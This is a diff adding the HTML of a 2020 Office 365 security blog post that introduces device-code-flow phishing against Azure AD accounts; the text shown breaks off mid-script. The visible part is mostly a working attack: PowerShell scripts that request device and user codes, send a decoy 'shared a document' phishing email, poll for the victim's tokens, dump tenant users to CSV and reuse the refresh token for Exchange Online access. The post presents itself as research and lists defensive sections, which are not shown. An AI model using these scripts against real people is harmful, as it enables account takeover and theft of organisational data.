@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+<html lang="en-gb">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="cache-control" content="no-cache"> 
+<meta http-equiv="expires" content="0"> 
+<meta http-equiv="pragma" content="no-cache">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Introducing a new phishing technique for compromising Office 365 accounts</title>
+<meta name="description" content="The site for Microsoft 365 and Azure AD administrators">
+<meta name="generator" content="Hugo 0.39" />
+<meta property="og:title" content="Introducing a new phishing technique for compromising Office 365 accounts" />
+<meta property="og:description" content="The ongoing global phishing campaings againts Microsoft 365 have used various phishing techniques.
+Currently attackers are utilising forged login sites and OAuth app consents.
+
+In this blog, I&rsquo;ll introduce a new phishing technique based on Azure AD device code authentication flow.
+I&rsquo;ll also provide instructions on how to detect usage of compromised credentials and what to do to prevent phishing using the new technique.
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://o365blog.com/post/phishing/" />
+
+
+
+<meta property="article:published_time" content="2020-10-13T00:00:00&#43;00:00"/>
+
+<meta property="article:modified_time" content="2021-09-10T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="dns-prefetch" href="//fonts.googleapis.com" />
+<link rel="dns-prefetch" href="//fonts.gstatic.com" />
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700" type="text/css" media="all" />
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
+<script type="text/javascript" src="/js/scripts.js"></script>
+<script type="text/javascript" src="/js/tools.js"></script>
+
+<link rel="apple-touch-icon-precomposed" sizes="57x57" href="/images/apple-touch-icon-57x57.png" />
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114.png" />
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72.png" />
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144.png" />
+<link rel="apple-touch-icon-precomposed" sizes="60x60" href="/images/apple-touch-icon-60x60.png" />
+<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/images/apple-touch-icon-120x120.png" />
+<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/images/apple-touch-icon-76x76.png" />
+<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/images/apple-touch-icon-152x152.png" />
+<link rel="icon" type="image/png" href="/images/favicon-196x196.png" sizes="196x196" />
+<link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32" />
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16" />
+<link rel="icon" type="image/png" href="/images/favicon-128.png" sizes="128x128" />
+<meta name="application-name" content="&nbsp;"/>
+<meta name="msapplication-TileColor" content="#FFFFFF" />
+<meta name="msapplication-TileImage" content="/images/mstile-144x144.png" />
+<meta name="msapplication-square70x70logo" content="/images/mstile-70x70.png" />
+<meta name="msapplication-square150x150logo" content="/images/mstile-150x150.png" />
+<meta name="msapplication-wide310x150logo" content="/images/mstile-310x150.png" />
+<meta name="msapplication-square310x310logo" content="/images/mstile-310x310.png" />
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-61454000-4', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+</head>
+<body class="body body-right-sidebar mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
+	<div class="container container-outer">
+		<header class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
+		
+			<div class="container container-inner clearfix">
+			
+				<div class="logo" role="banner" itemscope="itemscope" itemtype="http://schema.org/Brand">
+				
+					<a class="logo__link" href="/" title="Office 365 blog" rel="home">
+						<img src="/images/favicon-96x96.png"><h1 class="logo__title">Office 365 blog</h1>
+						<h2 class="logo__tagline">Everything about Microsoft 365 security</h2>
+					</a>
+				</div>
+			</div>
+			
+<nav class="menu" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
+	<ul class="menu__list">
+		<li class="menu__item "><a class="menu__link" href="/aadkillchain/">AAD &amp; M365 KILL CHAIN</a></li>
+		<li class="menu__item "><a class="menu__link" href="/aadinternals/">AAD INTERNALS</a></li>
+		<li class="menu__item "><a class="menu__link" href="/links/">LINKS</a></li>
+		<li class="menu__item "><a class="menu__link" href="/powershell/">POWERSHELL</a></li>
+		<li class="menu__item "><a class="menu__link" href="/talks/">TALKS</a></li>
+		<li class="menu__item "><a class="menu__link" href="/tools/">TOOLS</a></li>
+	</ul>
+</nav>
+
+		</header>
+		<div class="wrapper clearfix">
+
+<main class="main-content content" role="main" itemprop="mainContentOfPage">
+	<article class="post">
+		<header class="post__header clearfix">
+			<h1 class="post__title">Introducing a new phishing technique for compromising Office 365 accounts</h1>
+			<p class="post__meta meta">
+				<svg class="icon icon-time" height="14" viewBox="0 0 16 16" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m8-.0000003c-4.4 0-8 3.6-8 8 0 4.4000003 3.6 8.0000003 8 8.0000003 4.4 0 8-3.6 8-8.0000003 0-4.4-3.6-8-8-8zm0 14.4000003c-3.52 0-6.4-2.88-6.4-6.4000003 0-3.52 2.88-6.4 6.4-6.4 3.52 0 6.4 2.88 6.4 6.4 0 3.5200003-2.88 6.4000003-6.4 6.4000003zm.4-10.4000003h-1.2v4.8l4.16 2.5600003.64-1.04-3.6-2.1600003z"/></svg>
+				<time class="post__meta-date" datetime="2020-10-13T00:00:00">October 13, 2020</time>
+					<time class="post__meta-lastmod" datetime="2021-09-10T00:00:00"> (Last Modified: September 10, 2021)</time>
+				<span class="post__meta-categories meta-categories">
+					<svg class="icon icon-category" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
+					<a class="meta-categories__link" href="/categories/blog" rel="category">blog</a></span>
+			</p>
+			<div class="post__tags tags clearfix">
+<ul class="tags__list">
+	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fphishing%2f&text=Introducing%20a%20new%20phishing%20technique%20for%20compromising%20Office%20365%20accounts&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fphishing%2f&mini=true&title=Introducing%20a%20new%20phishing%20technique%20for%20compromising%20Office%20365%20accounts&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
+</ul>
+</div>
+		</header>
+		<div class="post__content clearfix">
+			<figure class="post__thumbnail">
+				<img src="/images/posts/phishing.png" alt="Introducing a new phishing technique for compromising Office 365 accounts">
+			</figure>
+				<nav id="TableOfContents">
+<ul>
+<li><a href="#what-is-phishing">What is phishing</a></li>
+<li><a href="#current-phishing-techniques">Current phishing techniques</a>
+<ul>
+<li><a href="#forged-login-pages">Forged login pages</a></li>
+<li><a href="#oauth-consent">OAuth consent</a></li>
+</ul></li>
+<li><a href="#new-phishing-technique-device-code-authentication">New phishing technique: device code authentication</a>
+<ul>
+<li><a href="#what-is-device-code-authentication">What is device code authentication</a></li>
+<li><a href="#phishing-with-device-code-authentication">Phishing with device code authentication</a>
+<ul>
+<li><a href="#1-connecting-to-devicecode-endpoint">1. Connecting to /devicecode endpoint</a></li>
+<li><a href="#2-creating-a-phishing-email">2. Creating a phishing email</a></li>
+<li><a href="#3-catching-the-fish-victim-performs-the-authentication">3. &ldquo;Catching the fish&rdquo; - victim performs the authentication</a></li>
+<li><a href="#4-retrieving-the-access-tokens">4. Retrieving the access tokens</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#using-aadinternals-for-phishing">Using AADInternals for phishing</a>
+<ul>
+<li><a href="#email">Email</a></li>
+<li><a href="#teams">Teams</a></li>
+</ul></li>
+<li><a href="#detecting">Detecting</a></li>
+<li><a href="#preventing">Preventing</a></li>
+<li><a href="#mitigating">Mitigating</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+</nav>
+			<p>The <a href="https://threatpost.com/microsoft-seizes-domains-office-365-phishing-scam/157261" target="_blank">ongoing global phishing campaings</a> againts Microsoft 365 have used various phishing techniques.
+Currently attackers are utilising forged login sites and OAuth app consents.</p>
+
+<p>In this blog, I&rsquo;ll introduce a new phishing technique based on Azure AD device code authentication flow.
+I&rsquo;ll also provide instructions on how to detect usage of compromised credentials and what to do to prevent phishing using the new technique.</p>
+
+<p></p>
+
+<h1 id="what-is-phishing">What is phishing</h1>
+
+<p>According to <a href="https://phishing.org/what-is-phishing" target="_blank">phishing.org</a>:</p>
+
+<blockquote>
+<p>Phishing is a cybercrime in which a target or targets are contacted by email, telephone or text message by someone posing as a legitimate institution to lure individuals into providing sensitive data such as personally identifiable information, banking and credit card details, and passwords.</p>
+</blockquote>
+
+<h1 id="current-phishing-techniques">Current phishing techniques</h1>
+
+<p>There are numerous <a href="https://www.phishing.org/phishing-techniques" target="_blank">phishing techniques</a> to be used by criminals. Next I&rsquo;ll shortly introduce two of the most used techniques related to Microsoft 365 and Azure AD.</p>
+
+<h2 id="forged-login-pages">Forged login pages</h2>
+
+<p>This is the most common phishing technique, where attackers have created login pages that imitate legit login screens. When a victim enters credentials, attackers can use those to log in using victim&rsquo;s identity.</p>
+
+<p>Lately some sophisticated phishing sites have checked the entered credentials <a href="https://threatpost.com/office-365-phishing-attack-leverages-real-time-active-directory-validation/159188/" target="_blank">in real time using authentication APIs</a>.</p>
+
+<p>This type of phishing can be easily prevented by enabling <a href="https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-mfa-howitworks" target="_blank">Multi-Factor Authentication</a> (MFA).
+MFA is included in all Microsoft 365 and Azure AD subscriptions.</p>
+
+<p><strong>Note!</strong> Using MFA does not prevent the phishing per se. Instead, it prevents attackers from logging in as the victim as the attacker is not able to perform the MFA.
+However, if the victim is using the same password on other services, the compromised credentials can be used on those services.</p>
+
+<h2 id="oauth-consent">OAuth consent</h2>
+
+<p>Another commonly used technique is to lure victims to <a href="https://www.bleepingcomputer.com/news/security/phishing-attack-hijacks-office-365-accounts-using-oauth-apps/" target="_blank">give consent to an application</a> to access their data.
+These apps are often named to mimic legit apps, such as &ldquo;0365 Access&rdquo; or &ldquo;Newsletter App&rdquo;:</p>
+
+<p><img src="/images/posts/phishing_4.png" alt="User consent" /></p>
+
+<p>:point_right: See a <a href="https://www.nixu.com/blog/demonstration-illicit-consent-grant-attack-azure-ad-office-365" target="_blank">demo</a> by <a href="https://twitter.com/SantasaloJoosua" target="_blank">@SantasaloJoosua</a> to learn how this works in real-life.</p>
+
+<p>This type of phishing can be reduced by restricting users from registering new apps to Azure AD:
+<img src="/images/posts/phishing_2.png" alt="Azure Portal" /></p>
+
+<p>There is also a preview feature which allows preventing the users for giving consents to apps:
+<img src="/images/posts/phishing_3.png" alt="Azure Portal" /></p>
+
+<h1 id="new-phishing-technique-device-code-authentication">New phishing technique: device code authentication</h1>
+
+<p>Next, I&rsquo;ll demonstrate a new phishing technique for compromising Office 365 / Azure AD accounts.</p>
+
+<h2 id="what-is-device-code-authentication">What is device code authentication</h2>
+
+<p>According to Microsoft <a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code" target="_blank">documentation</a> the device code authentication:</p>
+
+<blockquote>
+<p>allows users to sign in to input-constrained devices such as a smart TV, IoT device, or printer. To enable this flow, the device has the user visit a webpage in their browser on another device to sign in. Once the user signs in, the device is able to get access tokens and refresh tokens as needed.</p>
+</blockquote>
+
+<p>The process is as follows:</p>
+
+<ol>
+<li>A user starts an app supporting device code flow on a device</li>
+<li>The app connects to Azure AD /devicecode endpoint and sends <strong>client_id</strong> and <strong>resource</strong></li>
+<li>Azure AD sends back <strong>device_code</strong>, <strong>user_code</strong>, and <strong>verification_url</strong></li>
+<li>Device shows the <strong>verification_url</strong> (hxxps://microsoft.com/devicelogin) and the <strong>user_code</strong> to the user</li>
+<li>User opens a browsers and browses to <strong>verification_url</strong>, gives the <strong>user_code</strong> when asked and logs in</li>
+<li>Device polls the Azure AD until after succesfull login it gets <strong>access_token</strong> and <strong>refresh_token</strong></li>
+</ol>
+
+<p><img src="/images/posts/phishing_5.png" alt="Device Code flow" /></p>
+
+<h2 id="phishing-with-device-code-authentication">Phishing with device code authentication</h2>
+
+<p>The basic idea to utilise device code authentication for phishing is following.</p>
+
+<ol>
+<li>An attacker connects to /devicecode endpoint and sends <strong>client_id</strong> and <strong>resource</strong></li>
+<li>After receiving <strong>verification_uri</strong> and <strong>user_code</strong>, create an email containing a link to <strong>verification_uri</strong> and <strong>user_code</strong>, and send it to the victim.</li>
+<li>Victim clicks the link, provides the code and completes the sign in.</li>
+<li>The attacker receives <strong>access_token</strong> and <strong>refresh_token</strong> and can now mimic the victim.</li>
+</ol>
+
+<h3 id="1-connecting-to-devicecode-endpoint">1. Connecting to /devicecode endpoint</h3>
+
+<p>The first step is to make a http POST to Azure AD devicecode endpoint:</p>
+
+<pre><code> https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
+</code></pre>
+
+<p>I&rsquo;m using the following parameters. I chose to use &ldquo;Microsoft Office&rdquo; client_id because it looks the most legit app name, and it can be used to access other resources too.
+The chosen resource gives access to AAD Graph API which is used by MSOnline PowerShell module.</p>
+
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Value</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>client_id</td>
+<td>d3590ed6-52b3-4102-aeff-aad2292ab01c</td>
+</tr>
+
+<tr>
+<td>resource</td>
+<td><a href="https://graph.windows.net">https://graph.windows.net</a></td>
+</tr>
+</tbody>
+</table>
+
+<p>The response is similar to following:
+<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+	<span class="nt">&#34;user_code&#34;</span><span class="p">:</span> <span class="s2">&#34;CLZ8HAV2L&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;device_code&#34;</span><span class="p">:</span> <span class="s2">&#34;CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;verification_url&#34;</span><span class="p">:</span> <span class="s2">&#34;https://microsoft.com/devicelogin&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;expires_in&#34;</span><span class="p">:</span> <span class="s2">&#34;900&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;interval&#34;</span><span class="p">:</span> <span class="s2">&#34;5&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate.&#34;</span>
+<span class="p">}</span></code></pre></div></p>
+
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Description</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>user_code</td>
+<td>The code a user will enter when requested</td>
+</tr>
+
+<tr>
+<td>device_code</td>
+<td>The device code used to &ldquo;poll&rdquo; for authentication result</td>
+</tr>
+
+<tr>
+<td>verification_url</td>
+<td>The url the user needs to browse for authentication</td>
+</tr>
+
+<tr>
+<td>expires_in</td>
+<td>The expiration time in seconds (15 minutes)</td>
+</tr>
+
+<tr>
+<td>interval</td>
+<td>The interval in seconds how often the client should poll for authentication</td>
+</tr>
+
+<tr>
+<td>message</td>
+<td>The pre-formatted message to be show to the user</td>
+</tr>
+</tbody>
+</table>
+
+<p>Here is a script to connect to devicelogin endpoint:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create a body, we&#39;ll be using client id of &#34;Microsoft Office&#34;</span>
+<span class="nv">$body</span><span class="p">=@{</span>
+	<span class="s2">&#34;client_id&#34;</span> <span class="p">=</span> <span class="s2">&#34;d3590ed6-52b3-4102-aeff-aad2292ab01c&#34;</span>
+	<span class="s2">&#34;resource&#34;</span> <span class="p">=</span>  <span class="s2">&#34;https://graph.windows.net&#34;</span>
+<span class="p">}</span>
+
+<span class="c"># Invoke the request to get device and user codes</span>
+<span class="nv">$authResponse</span> <span class="p">=</span> <span class="nb">Invoke-RestMethod</span> <span class="n">-UseBasicParsing</span> <span class="n">-Method</span> <span class="n">Post</span> <span class="n">-Uri</span> <span class="s2">&#34;https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&#34;</span> <span class="n">-Body</span> <span class="nv">$body</span>
+<span class="nv">$user_code</span> <span class="p">=</span>    <span class="nv">$authResponse</span><span class="p">.</span><span class="n">user_code</span></code></pre></div></p>
+
+<p><strong>Note!</strong> I&rsquo;m using a version 1.0 which is a little bit different than v2.0 flow used in the <a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code" target="_blank">documentation</a>.</p>
+
+<h3 id="2-creating-a-phishing-email">2. Creating a phishing email</h3>
+
+<p>Now that we have the <strong>verification_url</strong> (always the same) and <strong>user_code</strong> we can create and send a phishing email.</p>
+
+<p><strong>Note!</strong> For sending email you need a working smtp service.</p>
+
+<p>Here is a script to send a phishing email to the victim:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create a message</span>
+<span class="nv">$message</span> <span class="p">=</span> <span class="p">@</span><span class="s2">&#34;
+</span><span class="s2">&lt;html&gt;
+</span><span class="s2">Hi!&lt;br&gt;
+</span><span class="s2">Here is the link to the &lt;a href=&#34;</span><span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">microsoft</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">devicelogin</span><span class="s2">&#34;&gt;document&lt;/a&gt;. Use the following code to access: &lt;b&gt;$user_code&lt;/b&gt;. &lt;br&gt;&lt;br&gt;
+</span><span class="s2">&lt;/html&gt;
+</span><span class="s2">&#34;</span><span class="p">@</span>
+
+<span class="c"># Send the email</span>
+<span class="nb">Send-MailMessage</span> <span class="n">-from</span> <span class="s2">&#34;Don Director &lt;dond@something.com&gt;&#34;</span> <span class="n">-to</span> <span class="s2">&#34;william.victim@target.org&#34;</span> <span class="n">-Subject</span> <span class="s2">&#34;Don shared a document with you&#34;</span> <span class="n">-Body</span> <span class="nv">$message</span> <span class="n">-SmtpServer</span> <span class="nv">$SMTPServer</span> <span class="n">-BodyAsHtml</span> </code></pre></div>
+
+<p>The received email looks like this:
+<img src="/images/posts/phishing_6.png" alt="Device Code flow" /></p>
+
+<h3 id="3-catching-the-fish-victim-performs-the-authentication">3. &ldquo;Catching the fish&rdquo; - victim performs the authentication</h3>
+
+<p>When a victim clicks the link, the following site appears. As we can see, the url is a legit Microsoft url. The user is asked to enter the code from the email.</p>
+
+<p><img src="/images/posts/phishing_7.png" alt="Device code" /></p>
+
+<p>After entering the code, user is asked to select the user to sign in. As we can see, the user is asked to sign in to <strong>Microsoft Office</strong> - no consents are asked.</p>
+
+<p><strong>Note!</strong> If the user is not logged in, the user needs to log in using whatever methods the target organisation is using.</p>
+
+<p><img src="/images/posts/phishing_8.png" alt="Login" /></p>
+
+<p>After successfull authentication, the following is shown to the user. <br></p>
+
+<dl>
+<dt><img src="/images/posts/phishing_9.png" alt="Profit" /></dt>
+</dl>
+
+<p>:warning: <strong>At this point the identity of the user is compromised!</strong> :warning:</p>
+
+<h3 id="4-retrieving-the-access-tokens">4. Retrieving the access tokens</h3>
+
+<p>The last step for the attacker is to retrieve the access tokens. After completing the step 2. the attacker starts polling the Azure AD for the authentication status.</p>
+
+<p>Attacker needs to make an http POST to Azure AD token endpoint every 5 seconds:</p>
+
+<pre><code> https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
+</code></pre>
+
+<p>The request must include the following parameters (code is the device_code from the step 1)</p>
+
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Value</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>client_id</td>
+<td>d3590ed6-52b3-4102-aeff-aad2292ab01c</td>
+</tr>
+
+<tr>
+<td>resource</td>
+<td><a href="https://graph.windows.net">https://graph.windows.net</a></td>
+</tr>
+
+<tr>
+<td>code</td>
+<td>CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA</td>
+</tr>
+
+<tr>
+<td>grant_type</td>
+<td>urn:ietf:params:oauth:grant-type:device_code</td>
+</tr>
+</tbody>
+</table>
+
+<p>If the authentication is pending, an http error <strong>400 Bad Request</strong> is returned with the following content:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+	<span class="nt">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;authorization_pending&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;error_description&#34;</span><span class="p">:</span> <span class="s2">&#34;AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;error_codes&#34;</span><span class="p">:</span> <span class="p">[</span><span class="mi">70016</span><span class="p">],</span>
+	<span class="nt">&#34;timestamp&#34;</span><span class="p">:</span> <span class="s2">&#34;2020-10-13 18:06:07Z&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;trace_id&#34;</span><span class="p">:</span> <span class="s2">&#34;b35f261e-93cd-473b-9cf9-b81f30800600&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;correlation_id&#34;</span><span class="p">:</span> <span class="s2">&#34;8ee0ae8a-533f-4742-8334-e9ed939b083d&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;error_uri&#34;</span><span class="p">:</span> <span class="s2">&#34;https://login.microsoftonline.com/error?code=70016&#34;</span>
+<span class="p">}</span></code></pre></div>
+
+<p>After successfull login, we&rsquo;ll get the following response (tokens truncated):
+<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+	<span class="nt">&#34;token_type&#34;</span><span class="p">:</span> <span class="s2">&#34;Bearer&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;scope&#34;</span><span class="p">:</span> <span class="s2">&#34;user_impersonation&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;expires_in&#34;</span><span class="p">:</span> <span class="s2">&#34;7199&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;ext_expires_in&#34;</span><span class="p">:</span> <span class="s2">&#34;7199&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;expires_on&#34;</span><span class="p">:</span> <span class="s2">&#34;1602662787&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;not_before&#34;</span><span class="p">:</span> <span class="s2">&#34;1602655287&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;resource&#34;</span><span class="p">:</span> <span class="s2">&#34;https://graph.windows.net&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;access_token&#34;</span><span class="p">:</span> <span class="s2">&#34;eyJ0eXAi...HQOT1rvUEOEHLeQ&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;refresh_token&#34;</span><span class="p">:</span> <span class="s2">&#34;0.AAAAxkwD...WxPoK0Iq6W&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;foci&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
+	<span class="nt">&#34;id_token&#34;</span><span class="p">:</span> <span class="s2">&#34;eyJ0eXAi...widmVyIjoiMS4wIn0.&#34;</span>
+<span class="p">}</span></code></pre></div></p>
+
+<p>The following script connects to the Azure AD token endpoint and polls for authentication status.
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$continue</span> <span class="p">=</span> <span class="nv">$true</span>
+<span class="nv">$interval</span> <span class="p">=</span> <span class="nv">$authResponse</span><span class="p">.</span><span class="n">interval</span>
+<span class="nv">$expires</span> <span class="p">=</span>  <span class="nv">$authResponse</span><span class="p">.</span><span class="n">expires_in</span>
+
+<span class="c"># Create body for authentication requests</span>
+<span class="nv">$body</span><span class="p">=@{</span>
+	<span class="s2">&#34;client_id&#34;</span> <span class="p">=</span>  <span class="s2">&#34;d3590ed6-52b3-4102-aeff-aad2292ab01c&#34;</span>
+	<span class="s2">&#34;grant_type&#34;</span> <span class="p">=</span> <span class="s2">&#34;urn:ietf:params:oauth:grant-type:device_code&#34;</span>
+	<span class="s2">&#34;code&#34;</span> <span class="p">=</span>       <span class="nv">$authResponse</span><span class="p">.</span><span class="n">device_code</span>
+	<span class="s2">&#34;resource&#34;</span> <span class="p">=</span>   <span class="s2">&#34;https://graph.windows.net&#34;</span>
+<span class="p">}</span>
+
+<span class="c"># Loop while authorisation is pending or until timeout exceeded</span>
+<span class="k">while</span><span class="p">(</span><span class="nv">$continue</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="nb">Start-Sleep</span> <span class="n">-Seconds</span> <span class="nv">$interval</span>
+	<span class="nv">$total</span> <span class="p">+=</span> <span class="nv">$interval</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="nv">$total</span> <span class="o">-gt</span> <span class="nv">$expires</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="nb">Write-Error</span> <span class="s2">&#34;Timeout occurred&#34;</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+				
+	<span class="c"># Try to get the response. Will give 40x while pending so we need to try&amp;catch</span>
+	<span class="k">try</span>
+	<span class="p">{</span>
+		<span class="nv">$response</span> <span class="p">=</span> <span class="nb">Invoke-RestMethod</span> <span class="n">-UseBasicParsing</span> <span class="n">-Method</span> <span class="n">Post</span> <span class="n">-Uri</span> <span class="s2">&#34;https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 &#34;</span> <span class="n">-Body</span> <span class="nv">$body</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+	<span class="p">}</span>
+	<span class="k">catch</span>
+	<span class="p">{</span>
+		<span class="c"># This is normal flow, always returns 40x unless successful</span>
+		<span class="nv">$details</span><span class="p">=</span><span class="nv">$_</span><span class="p">.</span><span class="n">ErrorDetails</span><span class="p">.</span><span class="n">Message</span> <span class="p">|</span> <span class="nb">ConvertFrom-Json</span>
+		<span class="nv">$continue</span> <span class="p">=</span> <span class="nv">$details</span><span class="p">.</span><span class="n">error</span> <span class="o">-eq</span> <span class="s2">&#34;authorization_pending&#34;</span>
+		<span class="nb">Write-Host</span> <span class="nv">$details</span><span class="p">.</span><span class="n">error</span>
+
+		<span class="k">if</span><span class="p">(!</span><span class="nv">$continue</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="c"># Not pending so this is a real error</span>
+			<span class="nb">Write-Error</span> <span class="nv">$details</span><span class="p">.</span><span class="n">error_description</span>
+			<span class="k">return</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+
+	<span class="c"># If we got response, all okay!</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$response</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="k">break</span> <span class="c"># Exit the loop</span>
+	<span class="p">}</span>
+<span class="p">}</span></code></pre></div></p>
+
+<p>Now we can use the access token to impersonate the victim:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Dump the tenant users to csv</span>
+<span class="nb">Get-AADIntUsers</span> <span class="n">-AccessToken</span> <span class="nv">$response</span><span class="p">.</span><span class="n">access_token</span> <span class="p">|</span> <span class="nb">Export-Csv</span> <span class="n">users</span><span class="p">.</span><span class="n">csv</span></code></pre></div></p>
+
+<p>We can also get access tokens to other services using the refresh token as long as the client_id remains the same.</p>
+
+<p>The following script gets an access token for Exchange Online.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create body for getting access token for Exchange Online</span>
+<span class="nv">$body</span><span class="p">=@{</span>
+	<span class="s2">&#34;client_id&#34;</span> <span class="p">=</span>     <span class="s2">&#34;d3590ed6-52b3-4102-aeff-aad2292ab01c&#34;</span>
+	<span class="s2">&#34;grant_type&#34;</span> <span class="p">=</span>    <span class="s2">&#34;refresh_token&#34;</span>
+	<span class="s2">&#34;scope&#34;</span> <span class="p">=</span>         <span class="s2">&#34;openid&#34;</span>
+	<span class="s2">&#34;resource&#34;</span> <span class="p">=</span>      <span class="s2">&#34;https://outlook.office365.com&#34;</span>
+	<span class="s2">&#34;refresh_token&#34;</span> <span class="p">=</span> <span class="nv">$response</span><span class="p">.</span><span class="n">refresh_token</span>
+<span class="p">}</span>
+
